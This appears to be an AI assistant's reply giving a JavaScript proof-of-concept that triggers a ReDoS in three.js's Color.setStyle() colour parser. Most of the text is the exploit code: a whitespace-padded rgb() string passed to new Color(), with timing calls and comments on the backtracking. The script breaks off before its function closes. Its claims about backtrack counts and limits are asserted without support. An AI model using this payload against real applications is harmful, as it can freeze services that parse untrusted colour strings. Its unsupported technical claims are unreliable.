Here is the complete Proof-of-Concept script along with a detailed breakdown of why it successfully triggers the vulnerability.

```js
async function exploit() {
   const { Color } = await import('three');

   // The vulnerability lies in src/math/Color.js within the setStyle() method.
   // Specifically, this regex allows catastrophic backtracking:
   // /^(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*(?:,\s*(\d*\.?\d+)\s*)?$/
   // The multiple greedy \s* quantifiers create ambiguity. When the input fails 
   // to match the end anchor $ (due to misplaced/missing delimiters or trailing whitespace),
   // the regex engine exponentially retries matching paths, quickly surpassing 30,000 backtracks.

   const s = ' '.repeat(18); // 2^17 ≈ 131k > 30k backtrack limit

   // Malformed string: matches outer rgb(...), but internal spacing breaks the 
   // expected numeric sequence structure, forcing a full backtrack cascade.
   const maliciousColorString = `rgb( 255${s}, ${s} 255${s}, ${s} 255${s})`;

   console.log('Parsing malformed color string to trigger ReDoS...');
   console.time('REDO_BACKTRACK_TIME');

   // This invocation routes through Color.set() -> setStyle(), executing the vulnerable regex.
   new Color(maliciousColorString);

   console.timeEnd('REDO_BACKTRACK_TIME');
